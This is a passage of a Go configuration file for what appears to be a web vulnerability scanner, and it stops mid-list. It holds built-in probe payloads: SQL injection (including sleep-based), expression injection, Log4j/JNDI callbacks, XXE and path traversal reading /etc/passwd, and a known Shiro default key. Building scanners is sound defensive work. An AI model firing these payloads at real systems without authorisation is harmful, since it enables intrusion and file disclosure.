package config

import (
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"sync"
)

const currentConfigVersion = 31

type SessionIdentifier struct {
	Location string `json:"location"`
	Name     string `json:"name"`
}

// SessionKeyList is stored as a simple JSON string array. Its custom decoder
// also accepts the V1.1/V1.2 legacy [{location,name}] form so existing
// installations upgrade without manual config edits.
type SessionKeyList []string

func (s *SessionKeyList) UnmarshalJSON(data []byte) error {
	var keys []string
	if err := json.Unmarshal(data, &keys); err == nil {
		*s = normalizeSessionKeys(keys)
		return nil
	}
	var legacy []SessionIdentifier
	if err := json.Unmarshal(data, &legacy); err != nil {
		return errors.New("session_identifiers 必须是会话 Key 字符串数组")
	}
	for _, item := range legacy {
		keys = append(keys, item.Name)
	}
	*s = normalizeSessionKeys(keys)
	return nil
}

func normalizeSessionKeys(keys []string) SessionKeyList {
	seen := make(map[string]bool, len(keys))
	result := make(SessionKeyList, 0, len(keys))
	for _, key := range keys {
		key = strings.TrimSpace(key)
		lower := strings.ToLower(key)
		if key == "" || seen[lower] {
			continue
		}
		seen[lower] = true
		result = append(result, key)
	}
	return result
}

type PayloadRule struct {
	Name     string `json:"name"`
	Kind     string `json:"kind,omitempty"`
	Group    string `json:"group,omitempty"`
	Payload  string `json:"payload"`
	Expected string `json:"expected,omitempty"`
	Mode     string `json:"mode,omitempty"`
	Mime     string `json:"mime,omitempty"`
	Header   string `json:"header,omitempty"`
}

type DetectionRule struct {
	Name       string `json:"name"`
	Pattern    string `json:"pattern"`
	Severity   string `json:"severity,omitempty"`
	Confidence string `json:"confidence,omitempty"`
}

type PluginRuleConfig struct {
	ParameterNames []string        `json:"parameter_names,omitempty"`
	URLKeywords    []string        `json:"url_keywords,omitempty"`
	Paths          []string        `json:"paths,omitempty"`
	Payloads       []PayloadRule   `json:"payloads,omitempty"`
	Patterns       []DetectionRule `json:"patterns,omitempty"`
}

type RequestTransform struct {
	Name        string `json:"name"`
	Algorithm   string `json:"algorithm"`
	Source      string `json:"source,omitempty"`
	Destination string `json:"destination"`
	Pattern     string `json:"pattern,omitempty"`
	Replacement string `json:"replacement,omitempty"`
	Secret      string `json:"secret,omitempty"`
	Encoding    string `json:"encoding,omitempty"`
}

type ResponseExtractor struct {
	Name        string `json:"name"`
	Source      string `json:"source"`
	Pattern     string `json:"pattern"`
	Destination string `json:"destination"`
	// ParallelSafe opts into concurrent use of the extracted value. The default
	// remains serialized because many bank CSRF/nonces are single-use.
	ParallelSafe bool `json:"parallel_safe,omitempty"`
}

type Config struct {
	ConfigVersion           int                         `json:"config_version"`
	Listen                  string                      `json:"listen"`
	DefaultScheme           string                      `json:"default_scheme"`
	ScanMode                string                      `json:"scan_mode"`
	NormalPlugins           []string                    `json:"normal_plugins"`
	TimeoutSeconds          int                         `json:"timeout_seconds"`
	MaxConcurrency          int                         `json:"max_concurrency"`
	MaxActiveScans          int                         `json:"max_active_scans"`
	MaxQueuedScans          int                         `json:"max_queued_scans"`
	GlobalMaxConcurrency    int                         `json:"global_max_concurrency"`
	PerHostConcurrency      int                         `json:"per_host_concurrency"`
	RequestsPerSecond       float64                     `json:"requests_per_second"`
	GlobalRequestsPerSecond float64                     `json:"global_requests_per_second"`
	MaxResponseBytes        int64                       `json:"max_response_bytes"`
	MaxRequests             int                         `json:"max_requests"`
	BaselineSamples         int                         `json:"baseline_samples"`
	VerifyTLS               bool                        `json:"verify_tls"`
	FollowRedirects         bool                        `json:"follow_redirects"`
	AllowPrivateTargets     bool                        `json:"allow_private_targets"`
	AllowedHosts            []string                    `json:"allowed_hosts"`
	ProxyURL                string                      `json:"proxy_url"`
	TransportMode           string                      `json:"transport_mode"`
	TaskTTLMinutes          int                         `json:"task_ttl_minutes"`
	RedactEvidence          bool                        `json:"redact_evidence"`
	AuthorizationExpected   bool                        `json:"authorization_expected"`
	SessionIdentifiers      SessionKeyList              `json:"session_identifiers"`
	ExcludedParameterNames  []string                    `json:"excluded_parameter_names"`
	CommandParameterNames   []string                    `json:"command_parameter_names"`
	CSRFHeaderNames         []string                    `json:"csrf_header_names"`
	APIExposurePaths        []string                    `json:"api_exposure_paths"`
	CallbackListen          string                      `json:"callback_listen"`
	CallbackBaseURL         string                      `json:"callback_base_url"`
	CallbackLDAPListen      string                      `json:"callback_ldap_listen"`
	CallbackLDAPBaseURL     string                      `json:"callback_ldap_base_url"`
	CallbackMaxConnections  int                         `json:"callback_max_connections"`
	SuccessPatterns         []string                    `json:"success_patterns"`
	DeniedPatterns          []string                    `json:"denied_patterns"`
	SQLiErrorPatterns       []string                    `json:"sqli_error_patterns"`
	SQLiErrorConfidence     string                      `json:"sqli_error_confidence"`
	DynamicPatterns         []string                    `json:"dynamic_patterns"`
	ScanHeaderNames         []string                    `json:"scan_header_names"`
	RequestTransforms       []RequestTransform          `json:"request_transforms"`
	ResponseExtractors      []ResponseExtractor         `json:"response_extractors"`
	MaxScansPerMinute       int                         `json:"max_scans_per_minute"`
	SharedServiceMode       bool                        `json:"shared_service_mode"`
	ConfigWriteAllowedCIDRs []string                    `json:"config_write_allowed_cidrs"`
	PluginRules             map[string]PluginRuleConfig `json:"plugin_rules"`
	HostOverrides           map[string]string           `json:"-"`
}

func Default() Config {
	return Config{
		ConfigVersion: currentConfigVersion,
		Listen:        "0.0.0.0:8888", DefaultScheme: "https", ScanMode: "standard",
		NormalPlugins:  []string{"sqli", "sqli_extended", "file_upload", "file_read", "reflected_xss", "unauthorized", "xxe", "sms_abuse", "sensitive_data"},
		TimeoutSeconds: 10, MaxConcurrency: 8, MaxActiveScans: 4, RequestsPerSecond: 10,
		MaxQueuedScans: 32, GlobalMaxConcurrency: 32, PerHostConcurrency: 12, GlobalRequestsPerSecond: 40,
		MaxResponseBytes: 2_000_000, MaxRequests: 500, BaselineSamples: 2,
		VerifyTLS: true, FollowRedirects: false, AllowPrivateTargets: true,
		TransportMode:  "normalized",
		TaskTTLMinutes: 30, RedactEvidence: false, AuthorizationExpected: true,
		SessionIdentifiers: SessionKeyList{
			"cookie", "Authorization", "token", "accessToken", "access_token",
			"des_sessionId", "sessionId", "dseSessiond", "JSESSIONID", "SESSION", "X-Auth-Token",
		},
		ExcludedParameterNames: nil,
		CommandParameterNames:  []string{"cmd", "command", "exec", "execute", "executable", "program", "process", "script", "code", "expression", "groovy", "engine", "host", "ip", "path", "backuppath", "file", "url", "target"},
		CSRFHeaderNames:        []string{"X-CSRF-Token", "X-XSRF-Token", "CSRF-Token", "X-CSRFToken"},
		APIExposurePaths:       []string{"/v3/api-docs", "/v2/api-docs", "/api-docs", "/openapi.json", "/openapi.yaml", "/swagger-resources", "/swagger-ui.html", "/swagger-ui/index.html", "/doc.html"},
		CallbackListen:         "0.0.0.0:61166",
		CallbackBaseURL:        "http://127.0.0.1:61166",
		CallbackLDAPListen:     "0.0.0.0:61167",
		CallbackLDAPBaseURL:    "ldap://127.0.0.1:61167",
		CallbackMaxConnections: 128,
		SuccessPatterns:        []string{"\\\"code\\\"\\s*:\\s*\\\"?(?:0|200|000000)\\\"?", "\\\"success\\\"\\s*:\\s*true", "发送成功", "上传成功"},
		DeniedPatterns:         []string{"unauthorized", "access denied", "forbidden", "not authenticated", "未登录", "无权限", "请登录", "登录失效", "认证失败"},
		SQLiErrorPatterns: []string{
			`(?is)syntax error(?:\s+at|\s+near|\s+in)?`,
			`(?i)ORA-\d{5}`,
			`(?is)(?:numeric|floating.point|value).{0,80}(?:overflow|out of range)`,
			`(?i)SQLSTATE\s*[:\[]?\s*22003`,
			`(?is)(?:PSQLException|MySQLSyntaxErrorException|BadSqlGrammarException|UncategorizedSQLException)`,
		},
		SQLiErrorConfidence: "firm",
		DynamicPatterns:     []string{"(?i)\\\"(?:timestamp|time|requestId|traceId|nonce)\\\"\\s*:\\s*\\\"?[^\\\",}\\s]+", "\\b\\d{4}-\\d{2}-\\d{2}[T ][0-9:.+Z-]+", "\\b[0-9a-fA-F]{16,64}\\b"},
		ScanHeaderNames:     []string{"X-Forwarded-For", "X-Original-URL", "Referer", "User-Agent"},
		MaxScansPerMinute:   60,
		PluginRules:         defaultPluginRules(),
	}
}

func defaultPluginRules() map[string]PluginRuleConfig {
	rules := map[string]PluginRuleConfig{
		"unauthorized": {Payloads: []PayloadRule{{Name: "无效会话值", Kind: "invalid_session", Payload: "invalid-scanner-session"}}},
		"shiro": {Payloads: []PayloadRule{
			{Name: "Shiro 历史默认 AES Key", Kind: "key", Payload: "kPH+bIxk5D2deZiIxcaaaA=="},
		}},
		"java_expression": {Payloads: []PayloadRule{
			{Name: "Spring EL", Kind: "spel", Payload: "${{{left}}*{{right}}}"},
			{Name: "Spring EL #{ }", Kind: "spel", Payload: "#{{{left}}*{{right}}}"},
			{Name: "SpEL/Groovy 裸表达式", Kind: "raw_expression", Payload: "{{left}}*{{right}}"},
			{Name: "Thymeleaf *{ }", Kind: "thymeleaf", Payload: "*{{{left}}*{{right}}}", Mode: "deep"},
			{Name: "Thymeleaf 预处理", Kind: "thymeleaf", Payload: "__${{{left}}*{{right}}}__", Mode: "deep"},
			{Name: "Thymeleaf 预处理选择器", Kind: "thymeleaf", Payload: "__${{{left}}*{{right}}}__::.x", Mode: "deep"},
			{Name: "OGNL %{ }", Kind: "ognl", Payload: "%{{{left}}*{{right}}}", Mode: "deep"},
			{Name: "JSP EL", Kind: "jsp_el", Payload: "${{{left}}*{{right}}}", Mode: "deep"},
			{Name: "FreeMarker", Kind: "freemarker", Payload: "${{{left}}*{{right}}}", Mode: "deep"},
			{Name: "Velocity", Kind: "velocity", Payload: "#set($jhs={{left}}*{{right}})$jhs", Mode: "deep"},
		}},
		"jndi_injection": {Payloads: []PayloadRule{
			{Name: "Log4j/JNDI User-Agent", Kind: "callback", Header: "User-Agent", Payload: "${jndi:{{callback}}}"},
			{Name: "Log4j/JNDI X-Api-Version", Kind: "callback", Header: "X-Api-Version", Payload: "${jndi:{{callback}}}"},
		}},
		"host_header_injection": {Payloads: []PayloadRule{
			{Name: "X-Forwarded-Host", Kind: "header", Header: "X-Forwarded-Host", Payload: "{{host}}"},
			{Name: "X-Host", Kind: "header", Header: "X-Host", Payload: "{{host}}"},
			{Name: "Forwarded host", Kind: "header", Header: "Forwarded", Payload: "host={{host}}", Mode: "deep"},
		}},
		"sqli": {
			Payloads: []PayloadRule{
				{Name: "单引号破坏", Kind: "error_break", Group: "quote", Payload: "{{value}}'"},
				{Name: "双引号恢复", Kind: "error_repair", Group: "quote", Payload: "{{value}}''"},
				{Name: "拼接单引号破坏", Kind: "error_break", Group: "quote-concat-empty", Payload: "{{value}}'"},
				{Name: "空字符串拼接恢复", Kind: "error_repair", Group: "quote-concat-empty", Payload: "{{value}}'||''||'"},
				{Name: "双引号标识符破坏", Kind: "error_break", Group: "double-quote", Payload: "{{value}}\"", Mode: "deep"},
				{Name: "双引号标识符恢复", Kind: "error_repair", Group: "double-quote", Payload: "{{value}}\"\"", Mode: "deep"},
				{Name: "PostgreSQL/GaussDB 条件正常分支", Kind: "conditional_control", Group: "postgres-exp-string", Payload: "{{value}}'||(CASE WHEN 1=1 THEN '' ELSE exp(720::float8)::text END)||'"},
				{Name: "PostgreSQL/GaussDB 条件溢出分支", Kind: "conditional_error", Group: "postgres-exp-string", Payload: "{{value}}'||(CASE WHEN 1=2 THEN '' ELSE exp(720::float8)::text END)||'"},
				{Name: "MySQL/PostgreSQL/GaussDB 通用条件正常分支", Kind: "conditional_control", Group: "portable-exp-string", Payload: "{{value}}' AND (CASE WHEN 1=1 THEN 731 ELSE EXP(720) END)=731-- "},
				{Name: "MySQL/PostgreSQL/GaussDB 通用条件溢出分支", Kind: "conditional_error", Group: "portable-exp-string", Payload: "{{value}}' AND (CASE WHEN 1=2 THEN 731 ELSE EXP(720) END)=731-- "},
				{Name: "MySQL 条件正常分支", Kind: "conditional_control", Group: "mysql-exp-string", Payload: "{{value}}' AND IF(731=731,731,EXP(720))=731-- "},
				{Name: "MySQL 条件溢出分支", Kind: "conditional_error", Group: "mysql-exp-string", Payload: "{{value}}' AND IF(731=732,731,EXP(720))=731-- "},
				{Name: "数值布尔真", Kind: "boolean_true", Group: "numeric", Payload: "{{value}} AND 731=731"},
				{Name: "数值布尔假", Kind: "boolean_false", Group: "numeric", Payload: "{{value}} AND 731=732"},
				{Name: "字符串布尔真", Kind: "boolean_true", Group: "and-string", Payload: "{{value}}' AND '731'='731"},
				{Name: "字符串布尔假", Kind: "boolean_false", Group: "and-string", Payload: "{{value}}' AND '731'='732"},
				{Name: "LIKE 包裹字符串布尔真", Kind: "boolean_true", Group: "like-wrapped-string", Payload: "{{value}}%' AND '731'='731' AND '%'='"},
				{Name: "LIKE 包裹字符串布尔假", Kind: "boolean_false", Group: "like-wrapped-string", Payload: "{{value}}%' AND '731'='732' AND '%'='"},
				{Name: "括号上下文布尔真", Kind: "boolean_true", Group: "parenthesis", Payload: "{{value}}) AND (731=731", Mode: "deep"},
				{Name: "括号上下文布尔假", Kind: "boolean_false", Group: "parenthesis", Payload: "{{value}}) AND (731=732", Mode: "deep"},
				{Name: "数字注释上下文布尔真", Kind: "boolean_true", Group: "numeric-comment", Payload: "{{value}} AND 731=731-- ", Mode: "deep"},
				{Name: "数字注释上下文布尔假", Kind: "boolean_false", Group: "numeric-comment", Payload: "{{value}} AND 731=732-- ", Mode: "deep"},
				{Name: "字符串注释上下文布尔真", Kind: "boolean_true", Group: "string-comment", Payload: "{{value}}' AND 731=731-- ", Mode: "deep"},
				{Name: "字符串注释上下文布尔假", Kind: "boolean_false", Group: "string-comment", Payload: "{{value}}' AND 731=732-- ", Mode: "deep"},
				{Name: "双引号字符串布尔真", Kind: "boolean_true", Group: "double-quote-string", Payload: "{{value}}\" AND \"731\"=\"731", Mode: "deep"},
				{Name: "双引号字符串布尔假", Kind: "boolean_false", Group: "double-quote-string", Payload: "{{value}}\" AND \"731\"=\"732", Mode: "deep"},
				{Name: "数值 OR 基线对照", Kind: "boolean_true", Group: "or-numeric-control", Payload: "{{value}} OR 731=732", Mode: "deep"},
				{Name: "数值 OR 真条件探针", Kind: "boolean_false", Group: "or-numeric-control", Payload: "{{value}} OR 731=731", Mode: "deep"},
				{Name: "字符串 OR 基线对照", Kind: "boolean_true", Group: "or-string-control", Payload: "{{value}}' OR '731'='732", Mode: "deep"},
				{Name: "字符串 OR 真条件探针", Kind: "boolean_false", Group: "or-string-control", Payload: "{{value}}' OR '731'='731", Mode: "deep"},
				{Name: "PostgreSQL CAST 错误", Kind: "error_break", Group: "postgres-cast", Payload: "{{value}} AND CAST('jhs731' AS INTEGER)=731", Mode: "deep"},
				{Name: "PostgreSQL CAST 对照", Kind: "error_repair", Group: "postgres-cast", Payload: "{{value}} AND CAST('731' AS INTEGER)=731", Mode: "deep"},
				{Name: "PostgreSQL 零延迟对照", Kind: "time_control", Group: "postgres-pg-sleep-and", Payload: "{{value}} AND (SELECT 731 FROM pg_sleep(0))=731", Expected: "2", Mode: "deep"},
				{Name: "PostgreSQL 2秒延迟", Kind: "time_delay", Group: "postgres-pg-sleep-and", Payload: "{{value}} AND (SELECT 731 FROM pg_sleep(2))=731", Expected: "2", Mode: "deep"},
				{Name: "PostgreSQL 字符串零延迟对照", Kind: "time_control", Group: "postgres-pg-sleep-string", Payload: "{{value}}' AND (SELECT 731 FROM pg_sleep(0))=731-- ", Expected: "2", Mode: "deep"},
				{Name: "PostgreSQL 字符串2秒延迟", Kind: "time_delay", Group: "postgres-pg-sleep-string", Payload: "{{value}}' AND (SELECT 731 FROM pg_sleep(2))=731-- ", Expected: "2", Mode: "deep"},
				{Name: "GaussDB 零延迟对照", Kind: "time_control", Group: "gaussdb-pg-sleep-and", Payload: "{{value}} AND (SELECT 731 FROM pg_sleep(0))=731", Expected: "2", Mode: "deep"},
				{Name: "GaussDB 2秒延迟", Kind: "time_delay", Group: "gaussdb-pg-sleep-and", Payload: "{{value}} AND (SELECT 731 FROM pg_sleep(2))=731", Expected: "2", Mode: "deep"},
				{Name: "GaussDB 字符串零延迟对照", Kind: "time_control", Group: "gaussdb-pg-sleep-string", Payload: "{{value}}' AND (SELECT 731 FROM pg_sleep(0))=731-- ", Expected: "2", Mode: "deep"},
				{Name: "GaussDB 字符串2秒延迟", Kind: "time_delay", Group: "gaussdb-pg-sleep-string", Payload: "{{value}}' AND (SELECT 731 FROM pg_sleep(2))=731-- ", Expected: "2", Mode: "deep"},
				{Name: "MySQL 零延迟对照", Kind: "time_control", Group: "mysql-sleep-and", Payload: "{{value}} AND SLEEP(0)=0", Expected: "2", Mode: "deep"},
				{Name: "MySQL 2秒延迟", Kind: "time_delay", Group: "mysql-sleep-and", Payload: "{{value}} AND SLEEP(2)=0", Expected: "2", Mode: "deep"},
				{Name: "MySQL 字符串零延迟对照", Kind: "time_control", Group: "mysql-sleep-string", Payload: "{{value}}' AND SLEEP(0)=0-- ", Expected: "2", Mode: "deep"},
				{Name: "MySQL 字符串2秒延迟", Kind: "time_delay", Group: "mysql-sleep-string", Payload: "{{value}}' AND SLEEP(2)=0-- ", Expected: "2", Mode: "deep"},
				{Name: "MySQL 字符串 OR 零延迟对照", Kind: "time_control", Group: "mysql-sleep-or-select-string", Payload: "{{value}}' OR (SELECT SLEEP(0)) OR '731'='732", Expected: "3", Mode: "deep"},
				{Name: "MySQL 字符串 OR 3秒延迟", Kind: "time_delay", Group: "mysql-sleep-or-select-string", Payload: "{{value}}' OR (SELECT SLEEP(3)) OR '731'='731", Expected: "3", Mode: "deep"},
				{Name: "MySQL 字符串 AND SELECT 精确替换零延迟对照", Kind: "time_control", Group: "mysql-sleep-and-select-exact-replace", Payload: "' AND (SELECT SLEEP(0)) AND '1'='1", Expected: "3", Mode: "deep"},
				{Name: "MySQL 字符串 AND SELECT 精确替换3秒延迟", Kind: "time_delay", Group: "mysql-sleep-and-select-exact-replace", Payload: "' AND (SELECT SLEEP(3)) AND '1'='1", Expected: "3", Mode: "deep"},
				{Name: "MySQL 字符串 AND SELECT 模板闭合零延迟对照", Kind: "time_control", Group: "mysql-sleep-and-select-template-close", Payload: "{{value}}' AND (SELECT SLEEP(0)) AND '1'='1", Expected: "3", Mode: "deep"},
				{Name: "MySQL 字符串 AND SELECT 模板闭合3秒延迟", Kind: "time_delay", Group: "mysql-sleep-and-select-template-close", Payload: "{{value}}' AND (SELECT SLEEP(3)) AND '1'='1", Expected: "3", Mode: "deep"},
				{Name: "MySQL 双引号零延迟对照", Kind: "time_control", Group: "mysql-sleep-double-quote", Payload: "{{value}}\" AND SLEEP(0)=0-- ", Expected: "2", Mode: "deep"},
				{Name: "MySQL 双引号2秒延迟", Kind: "time_delay", Group: "mysql-sleep-double-quote", Payload: "{{value}}\" AND SLEEP(2)=0-- ", Expected: "2", Mode: "deep"},
			},
			Patterns: []DetectionRule{
				{Name: "PostgreSQL/JDBC 异常", Pattern: `(?is)(org\.postgresql\.util\.PSQLException|postgresql.{0,100}(?:error|exception)|PSQLException|SQLSTATE\s*[:\[]\s*(?:22|23|42|P0)[0-9A-Z]{3}|unterminated quoted string|syntax error at or near|invalid input syntax for (?:type|integer|numeric|uuid)|operator does not exist.{0,100}|column .{0,80} does not exist)`, Severity: "high", Confidence: "certain"},
				{Name: "GaussDB JDBC/内核异常", Pattern: `(?is)(GaussDB(?:\s+Kernel)?.{0,120}(?:ERROR|Exception)|com\.huawei\.gauss200\.jdbc|org\.opengauss\.util\.PSQLException|openGauss.{0,120}(?:ERROR|Exception)|GS-[0-9]{5}|SQLSTATE\s*[:\[]\s*(?:22|23|42|P0)[0-9A-Z]{3}.{0,180}(?:gauss|openGauss)|(?:gaussdb|opengauss).{0,180}(?:syntax error|invalid input syntax|column .{0,80} does not exist))`, Severity: "high", Confidence: "certain"},
				{Name: "MySQL/JDBC 异常", Pattern: `(?is)(com\.mysql\.(?:cj\.)?jdbc\.(?:exceptions\.)?(?:MySQLSyntaxErrorException|MysqlDataTruncation|StatementImpl)|MySQLSyntaxErrorException|You have an error in your SQL syntax|check the manual that corresponds to your MySQL server version|Unknown column .{0,100} in|Truncated incorrect .{0,80} value|XPATH syntax error:)`, Severity: "high", Confidence: "certain"},
				{Name: "MyBatis/Spring 数据访问异常", Pattern: `(?is)(org\.apache\.ibatis\.exceptions\.PersistenceException|MyBatisSystemException|BadSqlGrammarException|UncategorizedSQLException|DataIntegrityViolationException|#{3}\s*Error (?:querying|updating) database|#{3}\s*Cause:.{0,180}(?:SQLException|PSQLException|MySQLSyntaxErrorException)|The error may exist in .{0,180}(?:Mapper|\.xml)|java\.sql\.(?:SQLSyntaxErrorException|SQLException)|JDBC.{0,100}(?:Exception|error))`, Severity: "high", Confidence: "certain"},
				{Name: "存储过程/CallableStatement 异常", Pattern: `(?is)(CallableStatement.{0,120}(?:Exception|error)|callable statement.{0,120}(?:failed|error)|stored procedure.{0,120}(?:error|exception)|bad SQL grammar.{0,180}(?:call|CallableStatement))`, Severity: "high", Confidence: "certain"},
				{Name: "通用 SQL 语法异常", Pattern: `(?is)(SQL syntax.{0,120}|SQLSTATE\[|bad SQL grammar|syntax error.{0,100}(?:SQL|query)|database error|query failed)`, Severity: "high", Confidence: "firm"},
			},
		},
		"sqli_order_by": {
			ParameterNames: []string{"sort", "sortBy", "sortField", "sortColumn", "sortKey", "order", "orderBy", "orderField", "orderColumn", "field", "column", "direction"},
			Payloads: []PayloadRule{
				{Name: "MySQL ORDER BY 字段条件正常分支", Kind: "conditional_control", Group: "mysql-order-field-exp", Payload: "IF(731=731,{{value}},EXP(720))"},
				{Name: "MySQL ORDER BY 字段条件溢出分支", Kind: "conditional_error", Group: "mysql-order-field-exp", Payload: "IF(731=732,{{value}},EXP(720))"},
				{Name: "MySQL ORDER BY 方向条件正常分支", Kind: "conditional_control", Group: "mysql-order-direction-exp", Payload: "{{value}},IF(731=731,1,EXP(720))"},
				{Name: "MySQL ORDER BY 方向条件溢出分支", Kind: "conditional_error", Group: "mysql-order-direction-exp", Payload: "{{value}},IF(731=732,1,EXP(720))"},
				{Name: "MySQL ORDER BY 字段零延迟对照", Kind: "time_control", Group: "mysql-order-field-sleep", Payload: "IF(731=731,{{value}},SLEEP(0))", Expected: "2"},
				{Name: "MySQL ORDER BY 字段2秒延迟", Kind: "time_delay", Group: "mysql-order-field-sleep", Payload: "IF(731=732,{{value}},SLEEP(2))", Expected: "2"},
				{Name: "MySQL ORDER BY 方向零延迟对照", Kind: "time_control", Group: "mysql-order-direction-sleep", Payload: "{{value}},IF(731=731,1,SLEEP(0))", Expected: "2"},
				{Name: "MySQL ORDER BY 方向2秒延迟", Kind: "time_delay", Group: "mysql-order-direction-sleep", Payload: "{{value}},IF(731=732,1,SLEEP(2))", Expected: "2"},
				{Name: "PostgreSQL/GaussDB ORDER BY 字段正常分支", Kind: "conditional_control", Group: "postgres-gauss-order-field-cast", Payload: "{{value}},CAST(CASE WHEN 731=731 THEN '1' ELSE 'jhs731' END AS INTEGER)"},
				{Name: "PostgreSQL/GaussDB ORDER BY 字段异常分支", Kind: "conditional_error", Group: "postgres-gauss-order-field-cast", Payload: "{{value}},CAST(CASE WHEN 731=732 THEN '1' ELSE 'jhs731' END AS INTEGER)"},
				{Name: "PostgreSQL/GaussDB ORDER BY 方向正常分支", Kind: "conditional_control", Group: "postgres-gauss-order-direction-cast", Payload: "{{value}},CAST(CASE WHEN 731=731 THEN '1' ELSE 'jhs731' END AS INTEGER)"},
				{Name: "PostgreSQL/GaussDB ORDER BY 方向异常分支", Kind: "conditional_error", Group: "postgres-gauss-order-direction-cast", Payload: "{{value}},CAST(CASE WHEN 731=732 THEN '1' ELSE 'jhs731' END AS INTEGER)"},
			},
		},
		"sqli_limit": {
			ParameterNames: []string{"limit", "offset", "pageSize", "pageNo", "page", "start", "startRow", "rowStart", "rowCount", "size"},
			Payloads: []PayloadRule{
				{Name: "MySQL LIMIT 单引号破坏", Kind: "error_break", Group: "mysql-limit-comment", Payload: "{{value}}'-- "},
				{Name: "MySQL LIMIT 注释恢复", Kind: "error_repair", Group: "mysql-limit-comment", Payload: "{{value}}-- "},
				{Name: "PostgreSQL/GaussDB LIMIT/OFFSET 异常分支", Kind: "error_break", Group: "postgres-gauss-limit-cast", Payload: "({{value}} + CAST(CASE WHEN 731=732 THEN '0' ELSE 'jhs731' END AS INTEGER))"},
				{Name: "PostgreSQL/GaussDB LIMIT/OFFSET 正常分支", Kind: "error_repair", Group: "postgres-gauss-limit-cast", Payload: "({{value}} + CAST(CASE WHEN 731=731 THEN '0' ELSE 'jhs731' END AS INTEGER))"},
			},
		},
		"xxe": {
			Payloads: []PayloadRule{
				{Name: "内部实体", Kind: "inline", Payload: `<?xml version="1.0"?><!DOCTYPE {{root}} [<!ENTITY jungle_happy_scan "{{token}}">]>`, Expected: `{{token}}`},
				{Name: "Linux 文件实体", Kind: "file", Payload: `<?xml version="1.0"?><!DOCTYPE {{root}} [<!ENTITY jungle_happy_scan SYSTEM "file:///etc/passwd">]>`, Expected: `(?m)^root:x?:0:0:`},
				{Name: "回连实体", Kind: "callback", Payload: `<?xml version="1.0"?><!DOCTYPE {{root}} [<!ENTITY jungle_happy_scan SYSTEM "{{callback}}">]>`, Mode: "deep"},
				{Name: "XInclude Linux 文件", Kind: "xinclude_file", Payload: `<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/passwd" parse="text"/>`, Expected: `(?m)^root:x?:0:0:`, Mode: "deep"},
			},
		},
		"file_read": {
			ParameterNames: []string{"file", "path", "filename", "filepath", "download", "template", "resource", "document", "dir", "attachment"},
			Payloads: []PayloadRule{
				{Name: "passwd 目录穿越", Payload: "../../../../../../etc/passwd", Expected: `(?m)^root:x?:0:0:`},
				{Name: "passwd 绝对路径", Payload: "/etc/passwd", Expected: `(?m)^root:x?:0:0:`},
				{Name: "hosts 目录穿越", Payload: "../../../../../../etc/hosts", Expected: `(?m)^(?:127\.0\.0\.1|::1)[\t ]+(?:localhost(?:\.localdomain)?|ip6-localhost)(?:[\t ]|$)`},
				{Name: "hosts 绝对路径", Payload: "/etc/hosts", Expected: `(?m)^(?:127\.0\.0\.1|::1)[\t ]+(?:localhost(?:\.localdomain)?|ip6-localhost)(?:[\t ]|$)`},
				{Name: "proc/version 目录穿越", Payload: "../../../../../../proc/version", Expected: `(?im)^Linux version [0-9]+\.[0-9]+(?:\.[0-9]+)?[^\r\n]{0,300}$`},
				{Name: "proc/version 绝对路径", Payload: "/proc/version", Expected: `(?im)^Linux version [0-9]+\.[0-9]+(?:\.[0-9]+)?[^\r\n]{0,300}$`},
				{Name: "os-release 目录穿越", Payload: "../../../../../../etc/os-release", Expected: `(?ms)^(?:NAME|PRETTY_NAME)=.{1,500}^ID="?[\w.-]+"?[\t ]*$`},
				{Name: "os-release 绝对路径", Payload: "/etc/os-release", Expected: `(?ms)^(?:NAME|PRETTY_NAME)=.{1,500}^ID="?[\w.-]+"?[\t ]*$`},
				{Name: "passwd 双重编码穿越", Payload: "%2e%2e%252f%2e%2e%252fetc%252fpasswd", Expected: `(?m)^root:x?:0:0:`, Mode: "deep"},
				{Name: "hosts 双重编码穿越", Payload: "%2e%2e%252f%2e%2e%252fetc%252fhosts", Expected: `(?m)^(?:127\.0\.0\.1|::1)[\t ]+(?:localhost(?:\.localdomain)?|ip6-localhost)(?:[\t ]|$)`, Mode: "deep"},
				{Name: "proc/version 双重编码穿越", Payload: "%2e%2e%252f%2e%2e%252fproc%252fversion", Expected: `(?im)^Linux version [0-9]+\.[0-9]+(?:\.[0-9]+)?[^\r\n]{0,300}$`, Mode: "deep"},
				{Name: "hosts 非标准路径归一化", Payload: "....//....//....//....//....//....//etc/hosts", Expected: `(?m)^(?:127\.0\.0\.1|::1)[\t ]+(?:localhost(?:\.localdomain)?|ip6-localhost)(?:[\t ]|$)`, Mode: "deep"},
				{Name: "hosts file URI", Payload: "file:///etc/hosts", Expected: `(?m)^(?:127\.0\.0\.1|::1)[\t ]+(?:localhost(?:\.localdomain)?|ip6-localhost)(?:[\t ]|$)`, Mode: "deep"},
			},
		},
		"file_upload": {Payloads: []PayloadRule{
			{Name: "JSP 文件", Payload: "jungle-happy-scan-canary.jsp", Mime: "application/octet-stream", Expected: `(?i)(upload(?:ed)?\s+success|successfully\s+uploaded|上传成功|保存成功|"(?:code|status)"\s*:\s*"?(?:0|200|000000)"?)`},
			{Name: "JSPX 文件", Payload: "jungle-happy-scan-canary.jspx", Mime: "application/octet-stream", Expected: `(?i)(upload(?:ed)?\s+success|successfully\s+uploaded|上传成功|保存成功|"(?:code|status)"\s*:\s*"?(?:0|200|000000)"?)`},
			{Name: "PHP 文件", Payload: "jungle-happy-scan-canary.php", Mime: "application/octet-stream", Expected: `(?i)(upload(?:ed)?\s+success|successfully\s+uploaded|上传成功|保存成功|"(?:code|status)"\s*:\s*"?(?:0|200|000000)"?)`},
			{Name: "EXE 文件", Payload: "jungle-happy-scan-canary.exe", Mime: "application/octet-stream", Expected: `(?i)(upload(?:ed)?\s+success|successfully\s+uploaded|上传成功|保存成功|"(?:code|status)"\s*:\s*"?(?:0|200|000000)"?)`},
			{Name: "Shell 脚本文件", Payload: "jungle-happy-scan-canary.sh", Mime: "image/png", Expected: `(?i)(upload(?:ed)?\s+success|successfully\s+uploaded|上传成功|保存成功|"(?:code|status)"\s*:\s*"?(?:0|200|000000)"?)`},
			{Name: "HTML 文件", Payload: "jungle-happy-scan-canary.html", Mime: "text/html", Expected: `(?i)(upload(?:ed)?\s+success|successfully\s+uploaded|上传成功|保存成功|"(?:code|status)"\s*:\s*"?(?:0|200|000000)"?)`},
